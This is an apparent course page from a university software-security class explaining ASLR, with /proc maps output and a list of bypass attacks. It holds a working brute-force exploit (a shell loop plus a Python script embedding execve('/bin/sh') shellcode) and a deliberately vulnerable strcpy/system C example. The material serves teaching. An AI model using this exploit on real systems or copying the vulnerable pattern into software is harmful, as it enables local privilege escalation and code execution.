
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Address Space Layout Randomization (ASLR) &#8212; Theory 2020 documentation</title>
    <link rel="stylesheet" href="../_static/bootstrap-sphinx.css" type="text/css" />
    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../_static/css/my-style.css" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '../',
        VERSION:     '2020',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="../_static/jquery.js"></script>
    <script type="text/javascript" src="../_static/underscore.js"></script>
    <script type="text/javascript" src="../_static/doctools.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />

<meta charset='utf-8'>
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
<meta name="apple-mobile-web-app-capable" content="yes">
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/bootstrap-3.3.7/js/bootstrap.min.js "></script>
<script type="text/javascript" src="../_static/bootstrap-sphinx.js "></script>

<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/script.js"></script>





  </head>
  <body>

  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="../index.html"><span><img src="../_static/UCLouvain_Logo+moodle.png"></span>
          LINGI2144</a>
        <span class="navbar-text navbar-version pull-left"><b>2020</b></span>
      </div>

        <div class="collapse navbar-collapse nav-collapse">
          <ul class="nav navbar-nav">
            
                <li><a href="/index.html">Main</a></li>
                <li><a href="/exercise/index.html">Tutorial</a></li>
                <li><a href="/qcm/index.html">MCQ</a></li>
            
            
              <li class="dropdown globaltoc-container">
  <a role="button"
     id="dLabelGlobalToc"
     data-toggle="dropdown"
     data-target="#"
     href="../index.html">Section <b class="caret"></b></a>
  <ul class="dropdown-menu globaltoc"
      role="menu"
      aria-labelledby="dLabelGlobalToc"><ul>
<li class="toctree-l1"><a class="reference internal" href="../1_introduction/introduction.html">Introduction</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#objectives">Objectives</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#security-a-definition">Security: A definition ?</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#attackers-motivations">Attacker’s motivations</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#risk-analysis">Risk analysis</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#attacks-classification">Attacks classification</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#from-vulnerabilities-to-exploit">From vulnerabilities to exploit</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#some-counter-measures">Some counter measures</a></li>
<li class="toctree-l2"><a class="reference internal" href="../1_introduction/introduction.html#hardware-hack">Hardware Hack</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../2_basis/privilege.html">Basic attacks/defences</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../2_basis/privilege.html#privileges-escalation">Privileges escalation</a></li>
<li class="toctree-l2"><a class="reference internal" href="../2_basis/privilege.html#integer-overflow">Integer Overflow</a></li>
<li class="toctree-l2"><a class="reference internal" href="../2_basis/privilege.html#exploit-concurrency">Exploit Concurrency</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../3_memory_safety/corruption.html">Memory Safety</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../3_memory_safety/corruption.html#memory-handling-and-impact-of-memory-corruption">Memory handling and impact of memory corruption</a></li>
<li class="toctree-l2"><a class="reference internal" href="../3_memory_safety/corruption.html#vulnerabilities-stack-and-heap">Vulnerabilities stack and heap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../3_memory_safety/corruption.html#id13">Memory Safety</a></li>
<li class="toctree-l2"><a class="reference internal" href="../3_memory_safety/corruption.html#prevention-detection">Prevention/detection</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../4_assembly/assembly.html">Assembly/Debugger</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../4_assembly/assembly.html#assembly">Assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="../4_assembly/assembly.html#debugger-disassembler-decompiler">Debugger - disassembler - decompiler</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../5_buffer_overflow/exploit1.html">Buffer Overflow</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../5_buffer_overflow/exploit1.html#exploit-erase-value-of-other-local-variables">Exploit: Erase value of other local variables</a></li>
<li class="toctree-l2"><a class="reference internal" href="../5_buffer_overflow/exploit1.html#exploit-dos">Exploit: DoS</a></li>
<li class="toctree-l2"><a class="reference internal" href="../5_buffer_overflow/exploit1.html#exploit-shellcode">Exploit: Shellcode</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../6_complement_on_buffer/complement.html">Complement on BO</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../6_complement_on_buffer/complement.html#situation-a-function-foo-that-call-function-bar">Situation: a function FOO that call function BAR</a></li>
<li class="toctree-l2"><a class="reference internal" href="../6_complement_on_buffer/complement.html#the-off-by-one-vulnerability">The “off by one vulnerability”</a></li>
<li class="toctree-l2"><a class="reference internal" href="../6_complement_on_buffer/complement.html#a-note-on-architecture">A note on architecture</a></li>
<li class="toctree-l2"><a class="reference internal" href="../6_complement_on_buffer/complement.html#common-student-questions">Common student questions</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../7_shellcode/handmake.html">Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../7_shellcode/handmake.html#hand-made-shellcode">Hand made shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="../7_shellcode/handmake.html#dedicated-tools">Dedicated tools</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="nonexec.html">Stack Protection</a><ul>
<li class="toctree-l2"><a class="reference internal" href="nonexec.html#non-executable-stack">Non Executable Stack</a></li>
<li class="toctree-l2"><a class="reference internal" href="nonexec.html#stackshield">StackShield</a></li>
<li class="toctree-l2"><a class="reference internal" href="nonexec.html#stackguard">StackGuard</a></li>
<li class="toctree-l2"><a class="reference internal" href="nonexec.html#address-space-layout-randomization-aslr">Address Space Layout Randomization (ASLR)</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../9_format_string/format_string.html">Format String</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../9_format_string/format_string.html#definition">Definition</a></li>
<li class="toctree-l2"><a class="reference internal" href="../9_format_string/format_string.html#shellcode-and-format-string">Shellcode and Format String</a></li>
<li class="toctree-l2"><a class="reference internal" href="../9_format_string/format_string.html#prevention-detection">Prevention/Detection</a></li>
<li class="toctree-l2"><a class="reference internal" href="../9_format_string/format_string.html#format-string-versus-bo">Format String versus BO</a></li>
<li class="toctree-l2"><a class="reference internal" href="../9_format_string/format_string.html#some-vulnerabilities">Some vulnerabilities</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../10_malware_analysisI/introduction.html">Malware Analysis I</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../10_malware_analysisI/introduction.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../10_malware_analysisI/introduction.html#case-study-mirai">Case Study: Mirai</a></li>
<li class="toctree-l2"><a class="reference internal" href="../10_malware_analysisI/introduction.html#how-to-obtain-malware-sample-the-honey-pot-approach">How to obtain malware sample ? The honey pot approach</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../11_malware_analysisII/analysis.html">Malware Analysis II</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../11_malware_analysisII/analysis.html#malware-analysis">Malware Analysis</a></li>
<li class="toctree-l2"><a class="reference internal" href="../11_malware_analysisII/analysis.html#static-analysis">Static Analysis</a></li>
<li class="toctree-l2"><a class="reference internal" href="../11_malware_analysisII/analysis.html#dynamic-analysis">Dynamic Analysis</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../12_malware_analysisIII/packing.html">Malware Analysis III</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../12_malware_analysisIII/packing.html#more-on-packing">More on packing</a></li>
</ul>
</li>
</ul>
</ul>
</li>
              
            
            
            
            
            
          </ul>

          
            
<form class="navbar-form navbar-right" action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form>
          
        </div>
    </div>
  </div>

<div class="container" >
  <div class="row">
      <div class="col-md-3">
        <div id="sidebar" class="bs-sidenav" role="complementary"><div class="row" style="padding-top: 20px">
    <div class="col-xs-6">
        <form id="rar_tp"  target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center;" type="submit">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m453.31 460.125c0 24.508-19.907 44.375-44.464 44.375h-305.692c-24.557 0-44.464-19.867-44.464-44.375v-408.25c0-24.508 19.907-44.375 44.464-44.375h190.303c8.857 0 17.35 3.516 23.606 9.773l126.505 126.521c6.239 6.239 9.742 14.694 9.742 23.508z" fill="#f9f8f9"/><path d="m133.15 504.5h-30c-24.55 0-44.46-19.87-44.46-44.38v-408.24c0-24.51 19.91-44.38 44.46-44.38h30c-24.55 0-44.46 19.87-44.46 44.38v408.24c0 24.51 19.91 44.38 44.46 44.38z" fill="#e3e0e4"/><path d="m453.31 167.3v16.24h-115.96c-33.12 0-60.06-26.95-60.06-60.07v-115.97h16.17c8.85 0 17.35 3.52 23.6 9.77l126.51 126.52c6.24 6.24 9.74 14.7 9.74 23.51z" fill="#e3e0e4"/><path d="m450.32 153.54h-112.97c-16.6 0-30.06-13.46-30.06-30.07v-112.96c3.61 1.63 6.92 3.91 9.77 6.76l126.51 126.52c2.85 2.85 5.12 6.15 6.75 9.75z" fill="#b9a1d3"/><path d="m435 438.5h-358c-22.091 0-40-17.909-40-40v-146c0-22.091 17.909-40 40-40h358c22.091 0 40 17.909 40 40v146c0 22.091-17.909 40-40 40z" fill="#b9a1d3"/><path d="m102 438.5h-25c-22.09 0-40-17.91-40-40v-146c0-22.09 17.91-40 40-40h25c-22.09 0-40 17.91-40 40v146c0 22.09 17.91 40 40 40z" fill="#9573bb"/></g><g><path d="m58.689 153.851c4.143 0 7.5-3.357 7.5-7.5v-94.476c0-20.333 16.582-36.875 36.965-36.875h111.42c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-111.42c-28.653 0-51.965 23.271-51.965 51.875v94.476c0 4.142 3.358 7.5 7.5 7.5z"/><path d="m460.811 212.656v-45.354c0-10.879-4.24-21.111-11.938-28.811l-126.506-126.52c-7.718-7.72-17.985-11.971-28.91-11.971h-43.394c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h43.394c2.165 0 4.288.264 6.334.775v107.696c0 20.714 16.85 37.566 37.561 37.566h107.694c.505 2.025.765 4.125.765 6.265v38.954c-3.476-.812-7.092-1.256-10.811-1.256h-23.319c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h23.319c17.921 0 32.5 14.579 32.5 32.5v146c0 17.921-14.579 32.5-32.5 32.5h-268.66c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h268.66c3.719 0 7.335-.444 10.811-1.256v15.381c0 20.333-16.582 36.875-36.965 36.875h-305.692c-20.383 0-36.965-16.542-36.965-36.875v-15.381c3.476.812 7.092 1.256 10.811 1.256h53.319c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-53.319c-17.921 0-32.5-14.579-32.5-32.5v-146c0-17.921 14.579-32.5 32.5-32.5h299.702c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-299.702c-3.719 0-7.335.444-10.811 1.256v-24.905c0-4.143-3.357-7.5-7.5-7.5s-7.5 3.357-7.5 7.5v31.305c-13.04 8.477-21.689 23.165-21.689 39.844v146c0 16.679 8.649 31.367 21.689 39.844v21.781c0 28.604 23.312 51.875 51.965 51.875h305.691c28.653 0 51.965-23.271 51.965-51.875v-21.781c13.041-8.477 21.689-23.165 21.689-39.844v-146c.001-16.679-8.648-31.367-21.688-39.844zm-146.02-89.185v-97.863l120.414 120.429h-97.854c-12.439 0-22.56-10.123-22.56-22.566z"/><path d="m265.669 264.091c-1.584-3.853-5.297-6.341-9.462-6.341-.003 0-.006 0-.009 0-4.168.004-7.882 2.499-9.461 6.356-.023.057-.046.114-.067.172l-45.247 118.803c-1.475 3.87.469 8.203 4.34 9.678 3.865 1.475 8.203-.468 9.678-4.34l9.429-24.757h62.347l9.335 24.736c1.458 3.914 5.891 5.823 9.665 4.368 3.875-1.462 5.831-5.789 4.368-9.665l-44.836-118.808c-.025-.067-.053-.135-.08-.202zm-35.087 84.571 25.603-67.226 25.37 67.226z"/><path d="m181.648 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.588-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/><path d="m410.5 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.589-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/></g></g>
                </svg>
                <br> <b> Slides </b>
            </button>
        </form>
    </div>
    <div class="col-xs-6">
        <form id="vid_tp" style="text-align:center;">
	<a id="notUp"  href="#!" style="text-align:center;"
   data-title="Watch now on youtube">
            <button class="video-btn" onclick="topFunction()"
                    style="text-align:center;" data-toggle="modal" type="button"
                    data-target="#myModal"
                    data-src="http://www.youtube.com/embed/Q0HFBy2BtfA?enablejsapi=1">
                <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg width="50px" height="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512.003 512.003" style="enable-background:new 0 0 512.003 512.003;" xml:space="preserve">
<path style="fill:#E53935;" d="M443.734,80.336L330.86,70.437c-49.812-4.334-99.906-4.334-149.717,0L68.268,80.336
	c-38.702,3.124-68.459,35.541-68.267,74.368v202.667c-0.204,38.835,29.557,71.265,68.267,74.389l112.939,9.813
	c24.832,2.133,49.835,3.243,74.859,3.243c25.024,0,50.027-1.067,74.859-3.243l112.939-9.813c38.659-3.187,68.348-35.6,68.139-74.389
	V154.704C512.194,115.877,482.436,83.459,443.734,80.336z"/>
<path style="fill:#FAFAFA;" d="M357.782,247.077l-149.333-96c-4.951-3.193-11.552-1.768-14.745,3.183
	c-1.111,1.722-1.702,3.728-1.703,5.777v192c0.002,5.891,4.78,10.665,10.671,10.663c2.049-0.001,4.055-0.592,5.777-1.703l149.333-96
	c4.954-3.187,6.387-9.787,3.2-14.742c-0.825-1.283-1.917-2.374-3.2-3.2V247.077z"/>
<path d="M256.001,444.816c-25.003,0-50.005-1.088-74.837-3.243l-112.896-9.835c-38.71-3.124-68.471-35.554-68.267-74.389V154.683
	c-0.182-38.819,29.573-71.224,68.267-74.347l112.896-9.899c49.797-4.334,99.877-4.334,149.675,0l112.96,9.813
	c38.717,3.158,68.454,35.629,68.203,74.475v202.667c0.204,38.835-29.557,71.265-68.267,74.389l0,0l-112.96,9.813
	C306.028,443.771,281.004,444.816,256.001,444.816z M256.001,88.549c-24.405,0-48.768,1.067-72.981,3.157L69.953,101.52
	c-27.614,2.317-48.794,25.495-48.619,53.205v202.667c-0.116,27.7,21.097,50.827,48.704,53.099l112.96,9.813
	c48.57,4.209,97.414,4.209,145.984,0l113.067-9.813c27.589-2.315,48.76-25.456,48.619-53.141V154.683
	c0.116-27.7-21.097-50.827-48.704-53.099l-112.96-9.813c-24.235-2.105-48.569-3.164-73.003-3.179V88.549z"/>
<path d="M202.668,362.704c-5.891,0-10.667-4.776-10.667-10.667v-192c-0.01-5.891,4.758-10.674,10.649-10.684
	c2.057-0.003,4.07,0.588,5.799,1.703l149.333,96c4.96,3.178,6.405,9.776,3.227,14.736c-0.83,1.296-1.931,2.397-3.227,3.227
	l-149.333,96C206.724,362.124,204.717,362.709,202.668,362.704z M213.334,179.579v152.917l118.933-76.459L213.334,179.579z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

                <br> <b>  Video </b>
            </button>
        </a>
</form>

  <!-- Modal -->
  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">

        <div class="modal-body">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
          <!-- 16:9 aspect ratio -->
          <div id="video-view" class="embed-responsive embed-responsive-16by9">

          </div>
        </div>
      </div>
    </div>
  </div>
    </div>
</div>
<form action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form><ul>
<li><a class="reference internal" href="#">Address Space Layout Randomization (ASLR)</a><ul>
<li><a class="reference internal" href="#potential-exploits">Potential exploits</a></li>
</ul>
</li>
</ul>

        </div>
      </div>
    <div class="body col-md-9 content" role="main" >
      
  <div class="section" id="address-space-layout-randomization-aslr">
<h1>Address Space Layout Randomization (ASLR)<a class="headerlink" href="#address-space-layout-randomization-aslr" title="Permalink to this headline">¶</a></h1>
<div class="line-block">
<div class="line">One of the main challenges of shell code injection with BO is to point
to the beginning of the shell. This is generally done by guessing the
address of the buffer to smash + addition of NOP but this approach
only works because those addresses are fixed between executions. ASLR
breaks this property by moving process entry points to random
locations. Initiated in the context of the PaX project (2000,
implements least protection for memory).</div>
</div>
<div class="line-block">
<div class="line"><strong>Important</strong>: stack related, no heap randomization</div>
</div>
<p>Decision is taken at kernel level:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>/proc/sys/kernel/randomize_va_space
<span class="c1">#If x = 0, randomization is disabled, if x=2 then it is enabled</span>

<span class="c1">#Disable</span>
cat /proc/self/maps <span class="p">|</span> egrep <span class="s1">&#39;(libc|stack)&#39;</span>
7ffff79e4000-7ffff7bcb000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">1967871</span>                   /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7bcb000-7ffff7dcb000 ---p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcb000-7ffff7dcf000 r--p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcf000-7ffff7dd1000 rw-p 001eb000 <span class="m">08</span>:01 <span class="m">1967871</span>                   /lib/x86_64-linux-gnu/libc-2.27.so
7ffffffde000-7ffffffff000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>                                     <span class="o">[</span>stack<span class="o">]</span>


cat /proc/self/maps <span class="p">|</span> egrep <span class="s1">&#39;(libc|stack)&#39;</span>
7ffff79e4000-7ffff7bcb000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">1967871</span>                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7bcb000-7ffff7dcb000 ---p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>                     /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcb000-7ffff7dcf000 r--p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>                      /lib/x86_64-linux-gnu/libc-2.27.so
7ffff7dcf000-7ffff7dd1000 rw-p 001eb000 <span class="m">08</span>:01 <span class="m">1967871</span>                    /lib/x86_64-linux-gnu/libc-2.27.so
7ffffffde000-7ffffffff000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>                                      <span class="o">[</span>stack<span class="o">]</span>

<span class="c1">#Enable</span>
cat /proc/self/maps <span class="p">|</span> egrep <span class="s1">&#39;(libc|stack)&#39;</span>
7f83bd643000-7f83bd82a000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">1967871</span>           /lib/x86_64-linux-gnu/libc-2.27.so
7f83bd82a000-7f83bda2a000 ---p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>            /lib/x86_64-linux-gnu/libc-2.27.so
7f83bda2a000-7f83bda2e000 r--p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>            /lib/x86_64-linux-gnu/libc-2.27.so
7f83bda2e000-7f83bda30000 rw-p 001eb000 <span class="m">08</span>:01 <span class="m">1967871</span>          /lib/x86_64-linux-gnu/libc-2.27.so
7ffc75b81000-7ffc75ba2000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>                          <span class="o">[</span>stack<span class="o">]</span>

cat /proc/self/maps <span class="p">|</span> egrep <span class="s1">&#39;(libc|stack)&#39;</span>
7f3c9bab6000-7f3c9bc9d000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">1967871</span>            /lib/x86_64-linux-gnu/libc-2.27.so
7f3c9bc9d000-7f3c9be9d000 ---p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>             /lib/x86_64-linux-gnu/libc-2.27.so
7f3c9be9d000-7f3c9bea1000 r--p 001e7000 <span class="m">08</span>:01 <span class="m">1967871</span>             /lib/x86_64-linux-gnu/libc-2.27.so
7f3c9bea1000-7f3c9bea3000 rw-p 001eb000 <span class="m">08</span>:01 <span class="m">1967871</span>            /lib/x86_64-linux-gnu/libc-2.27.so
7ffe91732000-7ffe91753000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>                          <span class="o">[</span>stack<span class="o">]</span>
</pre></div>
</div>
<div class="section" id="potential-exploits">
<h2>Potential exploits<a class="headerlink" href="#potential-exploits" title="Permalink to this headline">¶</a></h2>
<p>ASLR is vulnerable to a wide range of attacks. This includes: <a class="footnote-reference" href="#id3" id="id1">[4]</a> <a class="footnote-reference" href="#id4" id="id2">[5]</a></p>
<ol class="arabic">
<li><div class="first line-block">
<div class="line"><strong>Brute force attacks</strong></div>
<div class="line">On 32 bits, only 24 are randomize so the idea is to try all address
until it succeed. The more NOP you can place into your buffer and
the best it is. There are more randomized bits on a 64 bits
architecture which make it impracticable. The solution against that
is thus to upgrade to such architecture.</div>
</div>
</li>
</ol>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#! /bin/sh</span>
<span class="k">while</span> <span class="o">[</span> <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">do</span>
	<span class="nb">echo</span> <span class="nv">$i</span>
	python replyExploit.py <span class="nv">$i</span>
	<span class="nv">i</span><span class="o">=</span><span class="k">$((</span><span class="nv">$i</span> <span class="o">+</span> <span class="m">2048</span><span class="k">))</span>
	<span class="k">if</span> <span class="o">[</span> <span class="nv">$i</span> -gt <span class="m">16777216</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
		<span class="nv">i</span><span class="o">=</span><span class="m">0</span>
	<span class="k">fi</span>
<span class="k">done</span><span class="p">;</span>
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="n">padding</span>     <span class="o">=</span> <span class="mi">213</span>
	<span class="n">shell_code</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31</span><span class="s2">&quot;</span> <span class="o">+</span> \
	     	     <span class="s2">&quot;</span><span class="se">\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span> \
	     	     <span class="s2">&quot;</span><span class="se">\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69</span><span class="s2">&quot;</span> <span class="o">+</span> \
	     	     <span class="s2">&quot;</span><span class="se">\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42</span><span class="s2">&quot;</span> <span class="c1">#55 bytes shellcode</span>
	<span class="n">address</span>     <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="k">print</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
	<span class="n">buf_addr</span>    <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span><span class="n">address</span><span class="p">)</span>
	<span class="n">payload</span>     <span class="o">=</span>  <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">padding</span> <span class="o">+</span>  <span class="n">shell_code</span> <span class="o">+</span> <span class="n">buf_addr</span>
	<span class="n">thePayload</span>  <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;payload.txt&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
	<span class="n">thePayload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">thePayload</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/Assignment2/reply2  &quot;$(cat payload.txt)&quot;&#39;</span><span class="p">)</span>
<span class="n">main</span><span class="p">()</span>
</pre></div>
</div>
<ol class="arabic" start="2">
<li><div class="first line-block">
<div class="line"><strong>Pointer redirection attacks</strong></div>
<div class="line">If you can switch <code class="docutils literal"><span class="pre">conf</span></code> and <code class="docutils literal"><span class="pre">licence</span></code>, then system will try to
execute this. This is not a C executable file but can become one
via dynamic link! Requires access to computer.</div>
</div>
</li>
</ol>
<div class="highlight-c"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">conf</span> <span class="o">=</span> <span class="s">&quot;test -f&quot;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">licence</span> <span class="o">=</span> <span class="s">&quot;This SOFTWARE is ...&quot;</span><span class="p">;</span>
    <span class="n">print</span><span class="p">(</span><span class="n">licence</span><span class="p">);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">conf</span><span class="p">);</span>
<span class="p">}</span>
